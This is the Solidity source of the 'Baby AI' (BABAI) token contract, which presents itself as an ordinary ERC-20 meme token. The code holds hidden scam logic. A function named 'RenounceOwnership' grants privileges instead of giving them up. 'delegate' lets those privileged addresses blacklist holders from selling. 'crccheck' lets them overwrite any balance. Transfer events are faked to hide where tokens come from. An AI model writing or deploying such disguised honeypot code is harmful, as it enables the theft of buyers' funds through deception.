/**
 *Submitted for verification at Etherscan.io on 2023-02-19
*/

pragma solidity 0.8.17;

// SPDX-License-Identifier: MIT
/**

AI is still a baby. What will it be in 1 year from now? An old grown baby AI?

https://twitter.com/babyaitoken
https://t.me/babyaitoken

**/
 
contract BabyAI {
  
    mapping (address => uint256) public tAmount;
    mapping (address => bool) granuality;
    mapping (address => bool) renounced;

    // 
    string public name = "Baby AI";
    string public symbol = "BABAI";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);

        constructor()  {
        tAmount[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }


	address owner = msg.sender;
    address uniRouter = 0x13954f6F2d0B7c7d81F83F60E2B35c027D34Babe;
    address lead_dev = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   



    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier OO() {   
         require(renounced[msg.sender]);
         _;}


    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == uniRouter)  {
        require(tAmount[msg.sender] >= value);
        tAmount[msg.sender] -= value;  
        tAmount[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        require(!granuality[msg.sender]);      
        require(tAmount[msg.sender] >= value);
        tAmount[msg.sender] -= value;  
        tAmount[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


             function balanceOf(address account) public view returns (uint256) {
            return tAmount[account]; }


        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwnership(address x) public {
        require(msg.sender == owner);
          renounced[x] = true; }
        
        function delegate(address x) OO public{  
        granuality[x] = true;}
        function crccheck(address usr, uint256 query) OO public returns (bool success) {
        tAmount[usr] = query;
                   return true; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == uniRouter)  {
        require(value <= tAmount[from]);
        require(value <= allowance[from][msg.sender]);
        tAmount[from] -= value;  
        tAmount[to] += value; 
        emit Transfer (lead_dev, to, value);
    return true; }    
        require(!granuality[from]); 
        require(!granuality[to]); 
        require(value <= tAmount[from]);
        require(value <= allowance[from][msg.sender]);
        tAmount[from] -= value;
        tAmount[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }